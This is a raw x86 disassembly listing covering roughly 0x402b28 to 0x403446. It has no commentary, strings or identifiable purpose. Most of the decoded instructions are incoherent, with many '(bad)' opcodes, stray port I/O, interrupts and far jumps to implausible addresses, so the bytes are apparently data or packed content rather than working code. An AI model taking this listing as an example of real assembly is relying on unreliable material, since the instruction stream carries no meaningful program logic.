  402b28:	les    edi,FWORD PTR [esp+ecx*1-0x18]
  402b2c:	or     eax,0x4bffd135
  402b31:	cmp    DWORD PTR [eax],edi
  402b33:	dec    eax
  402b34:	int    0x3b
  402b36:	or     eax,DWORD PTR [eax]
  402b38:	mov    WORD PTR [ebx],?
  402b3a:	mov    WORD PTR ds:0x4b8367,?
  402b40:	mov    WORD PTR [edi-0x5d3e0119],es
  402b46:	inc    esp
  402b47:	inc    ecx
	...
  402b5c:	mov    WORD PTR [ebx],fs
  402b5e:	ins    DWORD PTR es:[edi],dx
  402b5f:	stc    
  402b60:	jmp    0x402b88
  402b62:	leave  
  402b63:	add    eax,0x4b7347
  402b68:	mov    WORD PTR [ebx],?
  402b6a:	or     eax,DWORD PTR [eax]
  402b6c:	add    DWORD PTR [ecx-0x39341024],edi
  402b72:	cmp    al,0xe8
  402b74:	icebp  
  402b75:	retf   
  402b76:	sar    edi,1
  402b78:	or     DWORD PTR [ecx-0x6b4c1020],esi
  402b7e:	outs   dx,BYTE PTR ds:[esi]
  402b7f:	xor    al,0xb4
  402b81:	repz push eax
  402b83:	fldenv [ebx+0x3cd7a417]
  402b89:	mov    esp,0x944d4ba6
  402b8e:	fld    DWORD PTR ds:0xec61948c
  402b94:	in     al,dx
  402b95:	das    
  402b96:	loope  0x402b9b
  402b98:	xchg   DWORD PTR [esi+edx*8+0x7e],edx
  402b9c:	xlat   BYTE PTR ds:[ebx]
  402b9d:	xchg   ebx,eax
  402b9e:	loope  0x402ba3
  402ba0:	push   ebx
  402ba1:	nop    ecx
  402ba4:	arpl   WORD PTR [ebp-0x1f],ax
  402ba7:	add    ecx,DWORD PTR [esp+edx*4+0x35547f2e]
  402bae:	push   cs
  402baf:	(bad)  [ebx-0x6b]
  402bb2:	loope  0x402bb7
  402bb4:	mov    dh,0x94
  402bb6:	mov    eax,DWORD PTR [ebx]
  402bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb9:	xchg   esp,eax
  402bba:	mov    eax,DWORD PTR [ebx]
  402bbc:	add    DWORD PTR [edi],ecx
  402bbe:	jmp    0x402cab
	...
  402bd3:	add    BYTE PTR [ebx],ch
  402bd5:	inc    ebp
  402bd6:	xor    DWORD PTR [edi-0x2731b7f7],eax
  402bdc:	sbb    esp,esp
  402bde:	(bad)  
  402bdf:	mov    ds,WORD PTR [eax]
  402be1:	xor    eax,0xbf0bd8ce
  402be6:	mov    ch,0xeb
  402be8:	stos   BYTE PTR es:[edi],al
  402be9:	das    
  402bea:	loope  0x402bef
  402bec:	xchg   DWORD PTR [esi+edx*8+0x7e],edx
  402bf0:	lahf   
  402bf1:	xchg   ebx,eax
  402bf2:	loope  0x402bf7
  402bf4:	je     0x402beb
  402bf6:	cmp    BYTE PTR [ebx-0x74],al
  402bf9:	mov    esp,0x944d4c3e
  402bfe:	mov    DWORD PTR [ecx-0x30],edx
  402c01:	inc    esp
  402c02:	mov    cs,WORD PTR [esp+ecx*8]
  402c05:	xchg   esp,eax
  402c06:	ins    DWORD PTR es:[edi],dx
  402c07:	ror    BYTE PTR [esp+edx*4+0x6408e908],cl
  402c0e:	test   DWORD PTR [ebx+ebx*8+0x34],esp
  402c12:	mul    DWORD PTR [esi+0x5f]
  402c15:	loop   0x402bf7
  402c17:	call   0x94cf:0xe2f744bb
  402c1e:	mov    WORD PTR [ebx],?
  402c20:	(bad)  
  402c21:	xchg   esp,eax
  402c22:	or     BYTE PTR [eax+0xa],dh
  402c25:	xor    eax,0x12643ee7
  402c2a:	lea    eax,[ecx+0x64]
  402c2d:	inc    esp
  402c2e:	neg    DWORD PTR [ecx-0x57bfd819]
  402c34:	pop    DWORD PTR [ebx-0x43]
  402c37:	or     DWORD PTR [eax],eax
	...
  402c49:	add    BYTE PTR [eax],al
  402c4b:	add    BYTE PTR [esp+eax*2-0x9],dh
  402c4f:	adc    DWORD PTR [ecx+0x67690894],0x6406f2f3
  402c59:	nop
  402c5a:	enter  0xc3ee,0xf9
  402c5e:	pop    es
  402c5f:	jmp    0xe93043f3
  402c64:	test   BYTE PTR [edx],bl
  402c66:	xchg   esp,eax
  402c67:	jmp    0xde98c0fb
  402c6c:	std    
  402c6d:	sub    al,0xe7
  402c6f:	(bad)  
  402c70:	inc    ebx
  402c71:	in     eax,0xf7
  402c73:	xchg   esp,eax
  402c74:	cmp    BYTE PTR [edi+esi*8],dh
  402c77:	xabort 0x7c
  402c7a:	std    
  402c7b:	mov    esi,0xc18d11db
  402c80:	repz inc ebx
  402c82:	neg    DWORD PTR [ecx]
  402c84:	pusha  
  402c85:	idiv   DWORD PTR [edi]
  402c87:	sub    BYTE PTR [eax-0x147642bd],dl
  402c8d:	inc    ebx
  402c8e:	test   DWORD PTR [ecx],0x6908948e
  402c94:	loopne 0x402c48
  402c96:	repz add BYTE PTR [edx],dl
  402c99:	ins    BYTE PTR es:[edi],dx
  402c9a:	add    eax,eax
  402c9c:	mov    ecx,0xdbd8b83
  402ca1:	cmp    al,0xf7
  402ca3:	jmp    DWORD PTR [ecx+edx*8+0xce55033]
  402caa:	(bad)  
  402cab:	cld    
  402cac:	push   edx
  402cad:	imul   esi,edi,0x50
	...
  402cc4:	dec    ebp
  402cc5:	dec    ecx
  402cc6:	jmp    0xd185:0x8587a500
  402ccd:	cmp    esi,edi
  402ccf:	jmp    DWORD PTR ds:0xd2ecbd6a
  402cd5:	imul   esi,edi,0xffffffe8
  402cd8:	mov    bl,0x64
  402cda:	idiv   edi
  402cdc:	dec    ebp
  402cdd:	push   0xffffffbd
  402cdf:	call   0x51379876
  402ce4:	and    BYTE PTR ds:0x6b82efe4,0xe0
  402ceb:	fisttp DWORD PTR [ecx+0x6a]
  402cee:	imul   eax
  402cf0:	gs pop edi
  402cf2:	idiv   edi
  402cf4:	mov    ?,WORD PTR [eax-0x7b]
  402cf7:	test   DWORD PTR [ecx],esp
  402cf9:	cmp    dh,bh
  402cfb:	jmp    DWORD PTR [ebp+0x30]
  402cfe:	shl    dl,1
  402d00:	xor    eax,0xb0504897
  402d05:	adc    al,0xf4
  402d07:	out    dx,eax
  402d08:	inc    edx
  402d09:	push   0x58
  402d0b:	dec    DWORD PTR [eax+0x42ffe73b]
  402d11:	das    
  402d12:	mov    esp,0xe06a42f4
  402d17:	jmp    0x379756
  402d1c:	dec    eax
  402d1d:	aaa    
  402d1e:	out    0xff,eax
  402d20:	add    ch,BYTE PTR [edi]
  402d22:	(bad)  
  402d23:	test   DWORD PTR [edx+ebp*1+0xffde],0x0
	...
  402d3a:	add    BYTE PTR [eax],al
  402d3c:	or     DWORD PTR [ecx],ebp
  402d3e:	out    dx,al
  402d3f:	dec    ebx
  402d41:	and    eax,DWORD PTR [esi-0x213e3c02]
  402d47:	jne    0x402d01
  402d49:	adc    al,0xc6
  402d4b:	jecxz  0x402cd9
  402d4d:	sub    eax,0x1fab0061
  402d52:	fucomi st,st(7)
  402d54:	mov    ds:0xa06fe3e1,eax
  402d59:	jmp    0xd2cc983c
  402d5e:	cwde   
  402d5f:	in     al,dx
  402d60:	jnp    0x402d3d
  402d62:	fsubp  st(0),st
  402d64:	out    dx,al
  402d65:	xchg   esi,ebx
  402d67:	dec    DWORD PTR [ecx]
  402d69:	mov    cl,0xd7
  402d6b:	out    dx,eax
  402d6c:	jae    0x402de1
  402d6e:	cmp    edi,edi
  402d70:	and    DWORD PTR [esi+ebp*8+0x72a463ff],ebx
  402d77:	jecxz  0x402d05
  402d79:	sub    ecx,DWORD PTR [eax-0x22092b40]
  402d7f:	mov    ch,0x3c
  402d81:	stos   DWORD PTR es:[edi],eax
  402d82:	fdivp  st(7),st
  402d84:	xor    al,0x10
  402d86:	out    dx,al
  402d87:	(bad)  
  402d88:	cmp    esi,DWORD PTR [ebp+0x3323e888]
  402d8e:	(bad)  
  402d90:	loope  0x402df5
  402d92:	in     eax,dx
  402d93:	jmp    DWORD PTR [ebx]
  402d95:	neg    WORD PTR fs:[ebx]
  402d99:	imul   ebp,DWORD PTR [ecx+0xc6cc457],0xffffffff
	...
  402db4:	inc    ecx
  402db5:	push   eax
  402db6:	in     eax,dx
  402db7:	inc    DWORD PTR [ebx]
  402db9:	fs inc ecx
  402dbb:	loop   0x402d49
  402dbd:	sub    eax,DWORD PTR [eax]
  402dbf:	sar    BYTE PTR [eax+0x66],0x80
  402dc3:	(bad)  
  402dc4:	hlt    
  402dc5:	xchg   esp,eax
  402dc6:	sahf   
  402dc7:	aad    0xe3
  402dc9:	or     eax,0xe9998991
  402dce:	sub    DWORD PTR [ebx-0x74],eax
  402dd1:	inc    ebp
  402dd2:	dec    ebp
  402dd3:	aad    0x1
  402dd5:	cmp    DWORD PTR [esi-0x4cd33c2b],ebx
  402ddb:	loope  0x402d69
  402ddd:	xchg   esp,eax
  402dde:	ins    BYTE PTR es:[edi],dx
  402ddf:	jg     0x402d89
  402de1:	xor    DWORD PTR [esi-0x2b],esp
  402de4:	cmp    al,0x41
  402de6:	xchg   esp,eax
  402de7:	call   0xec966f9f
  402dec:	push   esi
  402ded:	xor    eax,0x550903e1
  402df2:	(bad)  [eax-0x75]
  402df5:	pop    es
  402df6:	pop    ebp
  402df7:	in     eax,0x83
  402df9:	inc    ecx
  402dfa:	pop    ecx
  402dfb:	or     DWORD PTR [ebx+0x41],ebp
  402dfe:	mov    ecx,DWORD PTR ds:[ecx]
  402e01:	sub    al,0x36
  402e03:	aad    0x6b
  402e05:	inc    ecx
  402e06:	push   esp
  402e07:	in     al,dx
  402e08:	jae    0x402e4b
  402e0a:	push   ss
  402e0b:	in     al,dx
  402e0c:	mov    eax,ds:0x2fd51e49
  402e11:	(bad)  [ecx+0x34418c42]
  402e17:	loopne 0x402e19
	...
  402e29:	add    BYTE PTR [eax],al
  402e2b:	add    BYTE PTR [ebx],dh
  402e2d:	inc    ecx
  402e2e:	imul   bl
  402e30:	es xor esp,ecx
  402e33:	add    eax,DWORD PTR [edi+0x16f87d54]
  402e39:	psubusw mm4,mm4
  402e3c:	and    eax,DWORD PTR [ecx+0x7a]
  402e3f:	rol    DWORD PTR [edi],cl
  402e41:	jg     0x402e7d
  402e43:	dec    esp
  402e44:	int    0x94
  402e46:	rcr    BYTE PTR [edi-0x1b3af8f5],cl
  402e4c:	add    eax,DWORD PTR [ecx-0x27]
  402e4f:	mov    dl,0xed
  402e51:	xchg   ebx,eax
  402e52:	or     cl,ch
  402e54:	fadd   DWORD PTR [esi]
  402e56:	clc    
  402e57:	mov    esi,0xae040c0
  402e5c:	jmp    0xe730:0xa9ef740
  402e63:	xchg   esi,eax
  402e64:	mov    eax,0xe07f502b
  402e69:	inc    eax
  402e6a:	push   edi
  402e6b:	daa    
  402e6c:	xlat   BYTE PTR ds:[ebx]
  402e6d:	push   esp
  402e6e:	pop    ebp
  402e6f:	jb     0x402e24
  402e71:	lods   eax,DWORD PTR ds:[esi]
  402e72:	add    BYTE PTR [ecx+0x6ef749ad],al
  402e78:	adc    al,0x64
  402e7a:	neg    DWORD PTR [ebx+edx*1]
  402e7d:	int3   
  402e7e:	dec    ecx
  402e7f:	jmp    0xdd37c494
  402e84:	xchg   DWORD PTR [ecx],edx
  402e86:	dec    edx
  402e87:	in     eax,0x16
  402e89:	stos   BYTE PTR es:[edi],al
  402e8a:	mov    ebp,0xc194ceb1
  402e8f:	sub    eax,DWORD PTR [eax]
	...
  402ea1:	add    BYTE PTR [eax],al
  402ea3:	add    BYTE PTR [ebx+0x40],bh
  402ea6:	pop    esp
  402ea7:	bound  ebp,QWORD PTR [ebx+0x14]
  402eaa:	int3   
  402eab:	xor    DWORD PTR [eax-0x70deb2a9],edi
  402eb1:	xchg   esp,eax
  402eb2:	or     cl,ch
  402eb4:	or     al,0xc2
  402eb6:	add    cl,ch
  402eb8:	ret    
  402eb9:	mov    ds:0x3f9394f7,al
  402ebe:	jge    0x402eb1
  402ec0:	mov    ch,0x94
  402ec2:	loopne 0x402ec0
  402ec4:	push   ebp
  402ec5:	inc    eax
  402ec6:	mul    DWORD PTR [eax+0x72]
  402ec9:	inc    eax
  402eca:	jecxz  0x402eb2
  402ecc:	call   0x902a23aa
  402ed1:	xchg   esp,eax
  402ed2:	or     BYTE PTR [edx+0x7d],dh
  402ed5:	or     DWORD PTR [eax+0x28],eax
  402ed8:	mov    BYTE PTR [ebx],ch
  402eda:	sbb    esp,DWORD PTR [edx+0x55]
  402edd:	inc    eax
  402ede:	xor    eax,DWORD PTR [eax]
  402ee0:	mov    dl,0x8c
  402ee2:	jge    0x402eed
  402ee4:	xor    cl,dh
  402ee6:	lock add ebp,esp
  402ee9:	xchg   ebx,eax
  402eea:	or     bl,ch
  402eec:	repz mov esi,0xde2a0b37
  402ef2:	loope  0x402e77
  402ef4:	js     0x402f46
  402ef6:	or     BYTE PTR [ebp-0x13],dh
  402ef9:	bound  edi,QWORD PTR [ebp-0x4]
  402efc:	or     eax,0xafff717
  402f01:	ror    BYTE PTR [ebp-0x8],0x9a
  402f05:	add    edx,ecx
  402f07:	or     BYTE PTR [eax],al
	...
  402f19:	add    BYTE PTR [eax],al
  402f1b:	add    BYTE PTR [ebp+0x603d837a],ah
  402f21:	or     BYTE PTR [ecx+0x0],0x3e
  402f25:	inc    eax
  402f26:	pop    esi
  402f27:	mov    edi,DWORD PTR [edx+0x60]
  402f2a:	idiv   BYTE PTR ss:[edx]
  402f2d:	arpl   WORD PTR [ebx],ax
  402f2f:	jmp    DWORD PTR [eax+0x67]
  402f32:	iret   
  402f33:	add    eax,0x498100
  402f38:	gs xchg ebx,eax
  402f3a:	or     BYTE PTR [eax],al
  402f3c:	sbb    dl,BYTE PTR [esi+0x5d]
  402f3f:	mov    ebp,DWORD PTR [ecx+0x756a5e7b]
  402f45:	bound  edi,QWORD PTR [ebp+0x8]
  402f48:	jge    0x402f6c
  402f4a:	icebp  
  402f4b:	(bad)  
  402f4c:	jp     0x402f0d
  402f4e:	lock jmp DWORD PTR [eax]
  402f51:	cmp    ebp,edi
  402f53:	jmp    0x402eea
  402f55:	cwde   
  402f56:	or     BYTE PTR [ebx+0xf7e998d],al
  402f5c:	adc    dl,BYTE PTR [ebx]
  402f5e:	aaa    
  402f5f:	and    ah,BYTE PTR [eax-0x3d720cc5]
  402f65:	cdq    
  402f66:	or     eax,0x36
  402f69:	not    DWORD PTR [esi+0x68]
  402f6c:	mov    WORD PTR [ebx+esi*1],fs
  402f6f:	inc    ecx
  402f70:	mov    WORD PTR [esi+0x2cee6ad4],es
  402f76:	or     ecx,DWORD PTR [ebx]
  402f78:	int3   
  402f79:	mov    BYTE PTR [eax],al
  402f7b:	(bad)  
  402f7c:	dec    esp
  402f7d:	xor    DWORD PTR [ebx],ecx
  402f7f:	push   0x0
	...
  402f91:	add    BYTE PTR [eax],al
  402f93:	add    BYTE PTR [eax-0x2d],cl
  402f96:	or     al,0x57
  402f98:	hlt    
  402f99:	(bad)  
  402f9a:	out    dx,al
  402f9b:	add    BYTE PTR [edx+eax*2-0x10768b35],cl
  402fa2:	or     al,BYTE PTR [eax]
  402fa4:	mov    bh,0x29
  402fa6:	rol    DWORD PTR [edi],0x8c
  402fa9:	sahf   
  402faa:	aam    0xa8
  402fac:	lods   al,BYTE PTR ds:[esi]
  402fad:	sub    al,0xb
  402faf:	xor    DWORD PTR [ecx+ebp*1+0x35d20352],0xb
  402fb7:	mov    ecx,ebx
  402fb9:	push   esi
  402fba:	cmp    cl,cl
  402fbc:	into   
  402fbd:	cmp    BYTE PTR [ebx],cl
  402fbf:	push   ebp
  402fc0:	pop    es
  402fc1:	(bad)  [esi+0x40b388c4]
  402fc7:	or     al,0x89
  402fc9:	sub    edi,ebx
  402fcb:	(bad)  
  402fcc:	jnp    0x402fea
  402fce:	rol    ebp,cl
  402fd0:	jns    0x402f59
  402fd2:	fimul  DWORD PTR [ecx+0x75da6fd1]
  402fd8:	nop
  402fd9:	jbe    0x40302b
  402fdb:	cld    
  402fdc:	pop    ebx
  402fdd:	sub    ebx,esi
  402fdf:	out    0x67,eax
  402fe1:	mov    eax,ds:0x294bffda
  402fe6:	sti    
  402fe7:	(bad)  
  402fe8:	mov    ecx,0x3875da47
  402fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fee:	lods   eax,DWORD PTR ds:[esi]
  402fef:	or     DWORD PTR [ebx+ebp*1-0x6bd78a26],ecx
  402ff6:	xor    ch,0x0
	...
  403009:	add    BYTE PTR [eax],al
  40300b:	add    BYTE PTR [ebx],ah
  40300d:	xchg   ebp,eax
  40300e:	out    dx,al
  40300f:	mov    ebx,0x36e1914e
  403014:	pop    es
  403015:	xor    DWORD PTR [edi],esi
  403017:	xor    eax,0xfc5c3d63
  40301c:	jmp    0x403039
  40301e:	rol    DWORD PTR [esp+ecx*4],0x24
  403022:	cli    
  403023:	ret    
  403024:	jns    0x402fbb
  403026:	push   ds
  403027:	sub    eax,0xfca34b4a
  40302c:	jecxz  0x403038
  40302e:	sub    al,0xfc
  403030:	or     ecx,DWORD PTR [edx]
  403032:	leave  
  403033:	je     0x40303c
  403035:	enter  0x1ced,0xcc
  403039:	inc    eax
  40303a:	pop    eax
  40303b:	rol    ebx,1
  40303d:	cmp    eax,0xeebe748e
  403042:	push   eax
  403043:	test   BYTE PTR [ebx-0x6c],dh
  403046:	cmc    
  403047:	jmp    0x94ac:0x5389e142
  40304e:	loope  0x40304c
  403050:	fcmovnb st,st(7)
  403052:	out    dx,al
  403053:	xor    BYTE PTR [edi],dh
  403055:	fisubr WORD PTR [eax]
  403057:	(bad)  
  403058:	xchg   esp,eax
  403059:	xchg   esp,eax
  40305a:	push   0xe5560f0a
  40305f:	fsub   QWORD PTR [edx-0x4]
  403062:	fild   WORD PTR [ebx]
  403064:	mov    WORD PTR [esi+ebx*4+0x234bca2c],ss
  40306b:	cld    
  40306c:	arpl   WORD PTR [ebp+0x3c84],si
	...
  403082:	add    BYTE PTR [eax],al
  403084:	int    0x94
  403086:	cdq    
  403087:	inc    ebp
  403088:	(bad)
  40308b:	(bad)  [ebx]
  40308d:	cmp    eax,0xefb4d106
  403092:	mov    ecx,0x52ac8c42
  403097:	ds int 0x94
  40309a:	or     BYTE PTR [ecx],al
  40309c:	test   al,0x3d
  40309e:	imul   esi
  4030a0:	(bad)  
  4030a1:	stos   DWORD PTR es:[edi],eax
  4030a2:	inc    ebx
  4030a3:	sub    BYTE PTR [eax-0x30cfab54],dl
  4030a9:	xchg   esp,eax
  4030aa:	loopne 0x4030fc
  4030ac:	fnstsw WORD PTR [edi+esi*8]
  4030af:	inc    ecx
  4030b0:	cmc    
  4030b1:	enter  0xe949,0x57
  4030b5:	dec    ebx
  4030b6:	inc    ebx
  4030b7:	sub    BYTE PTR [eax-0x43499dd4],cl
  4030bd:	cmp    al,0x60
  4030bf:	or     al,0xa1
  4030c1:	ror    DWORD PTR [eax],cl
  4030c3:	adc    ebp,edx
  4030c5:	retf   
  4030c6:	dec    ecx
  4030c7:	jmp    0x97380983
  4030cc:	fsubr  QWORD PTR [ebx-0x6bb0dda3]
  4030d2:	pusha  
  4030d3:	sahf   
  4030d4:	ja     0x4030a9
  4030d6:	or     BYTE PTR [ecx+0x76f73d73],dl
  4030dc:	inc    edi
  4030dd:	push   ebx
  4030de:	inc    ebx
  4030df:	sub    BYTE PTR [eax+0x4eb21dac],cl
  4030e5:	xchg   esp,eax
  4030e6:	loopne 0x403104
	...
  4030fc:	mov    ebp,0x52c1f73c
  403101:	ror    BYTE PTR [ecx-0x17],1
  403104:	out    0x87,eax
  403106:	inc    ebx
  403107:	test   al,0x8f
  403109:	sub    al,0x26
  40310b:	ds pop esp
  40310d:	cmp    al,0xcb
  40310f:	pushf  
  403110:	call   0x67e4b43d
  403115:	(bad)
  403119:	adc    al,0x30
  40311b:	jmp    0xe9f0beda
  403120:	(bad)  
  403121:	xchg   esp,eax
  403122:	or     BYTE PTR [eax],ah
  403124:	dec    ecx
  403125:	xchg   ecx,eax
  403126:	or     BYTE PTR [eax],al
  403128:	pop    esi
  403129:	add    ah,bl
  40312b:	pop    ss
  40312c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40312d:	(bad)  
  40312e:	push   esp
  40312f:	je     0x403169
  403131:	sbb    BYTE PTR [eax],dh
  403133:	das    
  403134:	cwde   
  403135:	mov    WORD PTR [edx+0x8982501],?
  40313b:	jmp    0x403165
  40313d:	push   cs
  40313e:	or     BYTE PTR [eax],al
  403140:	cmc    
  403141:	xchg   edi,eax
  403142:	dec    eax
  403143:	sbb    BYTE PTR [ebp+0x7ee47d90],0x56
  40314a:	rol    edx,0xe9
  40314d:	xchg   edi,eax
  40314e:	pop    ebp
  40314f:	mov    edx,ecx
  403151:	sbb    DWORD PTR [esi+0x53],0x6e
  403155:	int    0x4
  403157:	add    eax,0x893e5
  40315c:	adc    al,0x31
  40315e:	pop    eax
  40315f:	call   0x403164
	...
  403174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403175:	pop    esp
  403176:	idiv   edi
  403178:	cs dec eax
  40317a:	sbb    eax,0x3e
  40317d:	fld    QWORD PTR [eax]
  40317f:	mov    esp,DWORD PTR [eax-0x6c]
  403182:	jecxz  0x403186
  403184:	pop    ecx
  403185:	jns    0x40318a
  403187:	leave  
  403188:	cdq    
  403189:	mov    WORD PTR [eax-0x22360c2],cs
  40318f:	or     ebx,DWORD PTR [esp+ebx*8+0xa]
  403193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403194:	sub    al,0x9e
  403196:	enter  0xe8aa,0xf9
  40319a:	jl     0x403182
  40319c:	(bad)  
  40319d:	push   edi
  40319e:	push   ebx
  40319f:	pop    esi
  4031a0:	adc    bh,al
  4031a2:	leave  
  4031a3:	or     BYTE PTR [ebp-0x7a],dh
  4031a6:	pop    esi
  4031a7:	mov    ecx,0x89769
  4031ac:	aad    0xa7
  4031ae:	ficom  DWORD PTR [eax-0x536811ca]
  4031b4:	mov    WORD PTR [ebp-0x42b34a09],?
  4031ba:	sbb    BYTE PTR [ebx],ch
  4031bc:	sbb    al,0xb8
  4031be:	or     eax,0x66f0f90
  4031c3:	nop
  4031c4:	iret   
  4031c5:	add    DWORD PTR [esi],edx
  4031c7:	nop
  4031c8:	cdq    
  4031c9:	xor    edi,DWORD PTR [ebx-0x7d]
  4031cc:	dec    esi
  4031cd:	jb     0x40324b
  4031cf:	inc    ebx
  4031d0:	push   eax
  4031d1:	popf   
  4031d2:	jl     0x403250
  4031d4:	xchg   esi,eax
  4031d5:	mov    eax,ds:0x9005
	...
  4031ea:	add    BYTE PTR [eax],al
  4031ec:	xor    DWORD PTR [eax],0xf
  4031ef:	add    al,0x8f
  4031f1:	sbb    eax,0xdd4d3c4a
  4031f6:	inc    edi
  4031f7:	or     ebp,DWORD PTR [eax-0x75808359]
  4031fd:	cmp    DWORD PTR [eax+edx*4-0x71],ecx
  403201:	std    
  403202:	dec    ecx
  403203:	cmp    al,0x6d
  403205:	mov    ebp,0xa7880a47
  40320a:	jl     0x40328b
  40320c:	mov    ecx,edi
  40320e:	dec    ebp
  40320f:	add    ebx,esp
  403211:	ins    DWORD PTR es:[edi],dx
  403212:	int    0xc2
  403214:	mov    cl,BYTE PTR [edi]
  403216:	pushf  
  403217:	rcl    esi,0x2a
  40321a:	jb     0x4031de
  40321c:	xchg   ebx,eax
  40321d:	cmc    
  40321e:	retf   
  40321f:	call   0x8bbb38a8
  403224:	(bad)  
  403225:	mov    esp,0xf94f5b25
  40322a:	jno    0x403218
  40322c:	fild   WORD PTR [edx]
  40322e:	cmp    eax,0xf2f907fc
  403233:	pop    DWORD PTR [edi]
  403235:	stc    
  403236:	cli    
  403237:	(bad)  
  403238:	pop    ss
  403239:	icebp  
  40323a:	test   BYTE PTR [edi+0x22eaa69f],0xfc
  403241:	xchg   esp,eax
  403242:	mov    al,0x73
  403244:	fs (bad) 
  403246:	push   ss
  403247:	into   
  403248:	dec    ebx
  403249:	and    eax,0x8cc2bc64
  40324e:	dec    ebx
  40324f:	les    eax,FWORD PTR [eax]
	...
  403261:	add    BYTE PTR [eax],al
  403263:	add    BYTE PTR [ecx*4+0x3d2e4251],ah
  40326a:	push   ecx
  40326b:	sub    al,0xfc
  40326d:	adc    eax,0x15fc0727
  403272:	or     BYTE PTR [edi],al
  403274:	cld    
  403275:	mov    ecx,0x560774cf
  40327a:	jno    0x4032aa
  40327c:	imul   ebx,ebp,0xffffffa8
  40327f:	ret    0x9490
  403282:	cmp    al,0x79
  403284:	call   0xf320d79c
  403289:	cmp    DWORD PTR [esi+0x6c5db731],esi
  40328f:	inc    edi
  403290:	loopne 0x403276
  403292:	dec    ecx
  403293:	mov    es,WORD PTR [ebx+edx*8-0x1f]
  403297:	int3   
  403298:	cdq    
  403299:	cmp    DWORD PTR gs:[ebx-0x74],eax
  40329d:	sub    al,0x7b
  40329f:	lods   eax,DWORD PTR ds:[esi]
  4032a0:	mov    WORD PTR [edx+ebp*8-0x7189be3d],ss
  4032a7:	push   edi
  4032a8:	pushf  
  4032a9:	cmp    esp,edi
  4032ab:	push   DWORD PTR ds:0xa3040b95
  4032b1:	mov    edi,0x3821cce9
  4032b6:	pop    ecx
  4032b7:	test   DWORD PTR [ebx+0x4bf8e194],esi
  4032bd:	mov    edi,0xbf8340e0
  4032c2:	inc    ebp
  4032c3:	fsub   st(6),st
  4032c5:	pop    ecx
  4032c6:	loope  0x4032cb
	...
  4032dc:	xchg   DWORD PTR [ebp-0x1a],ebx
  4032df:	xchg   BYTE PTR [ecx-0x6c],dl
  4032e2:	or     cl,ch
  4032e4:	pop    DWORD PTR [edi]
  4032e6:	lea    edi,[edx]
  4032e8:	dec    edx
  4032e9:	cmp    edi,esi
  4032eb:	mov    ecx,0xe90990b7
  4032f0:	(bad)  
  4032f1:	sub    al,0x45
  4032f3:	aaa    
  4032f4:	mov    BYTE PTR [ebx+eax*1-0x5beac6d7],dl
  4032fb:	jmp    0xe575c78f
  403300:	mov    ss,WORD PTR [eax+ecx*1+0x7f308e6]
  403307:	jmp    0x7448e19b
  40330c:	or     al,BYTE PTR [ebp-0xa]
  40330f:	(bad)  
  403311:	jecxz  0x4032f3
  403313:	sbb    esi,DWORD PTR [edx]
  403315:	xchg   esp,eax
  403316:	or     BYTE PTR [edx+edx*1+0x45],bl
  40331a:	test   dh,0xc0
  40331d:	jecxz  0x4032ff
  40331f:	sub    edx,ebx
  403321:	cmp    bh,dh
  403323:	loop   0x4032f4
  403325:	mov    esi,0xcbf94114
  40332a:	dec    ecx
  40332b:	jmp    0xa03b4282
  403330:	fdivr  DWORD PTR [eax]
  403332:	pop    eax
  403333:	adc    DWORD PTR [ebp+0x42],0xbec88ef7
  40333a:	add    BYTE PTR [ecx],bl
  40333c:	ror    BYTE PTR [esi-0x2],1
  40333f:	jle    0x403341
	...
  403351:	add    BYTE PTR [eax],al
  403353:	add    al,bl
  403355:	sub    al,0x7
  403357:	jbe    0x403393
  403359:	mov    WORD PTR [ebp-0x8c6439c],es
  40335f:	pop    di
  403361:	sub    al,0x68
  403363:	push   edi
  403364:	pop    eax
  403365:	cmp    BYTE PTR [ecx-0x8c89c94],al
  40336b:	dec    esi
  40336c:	aad    0x94
  40336e:	bound  eax,QWORD PTR [eax]
  403370:	fimul  WORD PTR gs:[edx]
  403373:	push   0x75
  403375:	fimul  WORD PTR [ebx]
  403377:	push   0xc0089475
  40337c:	stos   BYTE PTR es:[edi],al
  40337d:	push   ds
  40337e:	in     al,0xfe
  403380:	stos   BYTE PTR es:[edi],al
  403381:	dec    eax
  403382:	loopne 0x4033e3
  403384:	mov    BYTE PTR [ebx+0x4bf08908],dl
  40338a:	dec    eax
  40338b:	je     0x4033ca
  40338d:	dec    ecx
  40338e:	jge    0x4033a0
  403390:	mov    bl,dh
  403392:	add    al,0xff
  403394:	mov    al,ds:0x88f7e04b
  403399:	dec    eax
  40339a:	test   DWORD PTR [ebx-0x782b783],0xd57e3d
  4033a4:	cmc    
  4033a5:	shl    BYTE PTR ss:[ebp-0x12],cl
  4033a9:	dec    edx
  4033aa:	mov    ebp,0xf74bcbec
  4033af:	call   0x482129
  4033b4:	sub    ah,BYTE PTR [esi]
  4033b6:	in     al,0xfe
	...
  4033cc:	sbb    cl,BYTE PTR [eax+eiz*8+0x69]
  4033d0:	pop    ss
  4033d1:	dec    esp
  4033d2:	test   DWORD PTR [ebx-0x3d3e97da],0x8b5d93b9
  4033dc:	or     DWORD PTR [edx],edx
  4033de:	int3   
  4033df:	in     al,dx
  4033e0:	or     ecx,DWORD PTR [edi+esi*8+0x53]
  4033e4:	or     ah,dh
  4033e6:	add    al,0xff
  4033e8:	mov    al,ds:0x6dbe6f3b
  4033ed:	ror    DWORD PTR [eax],1
  4033ef:	jmp    eax
  4033f1:	(bad)  
  4033f2:	aas    
  4033f3:	inc    ecx
  4033f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033f5:	pop    ebx
  4033f6:	push   edx
  4033f7:	cmc    
  4033f8:	jmp    0x882e:0x8cc0034b
  4033ff:	fimul  DWORD PTR [ebp+ebp*1-0x3fa8d4f5]
  403406:	mov    edi,ebp
  403408:	push   0x76
  40340a:	ret    
  40340b:	push   eax
  40340c:	hlt    
  40340d:	sub    DWORD PTR [eax+eax*1],ecx
  403410:	mov    ebp,ss
  403412:	cmp    ebx,ebp
  403414:	mov    WORD PTR ds:0xb19bbff6,gs
  40341a:	add    DWORD PTR [eax],0x4002d8c
  403420:	lea    ebp,ds:0x7b0b0f0b
  403426:	or     al,0x0
  403428:	mov    WORD PTR [eax-0x6a4303b7],gs
  40342e:	push   edi
  40342f:	jmp    0x403434
	...
  403444:	sbb    esp,DWORD PTR [esi]
  403446:	jo     0x4033cd
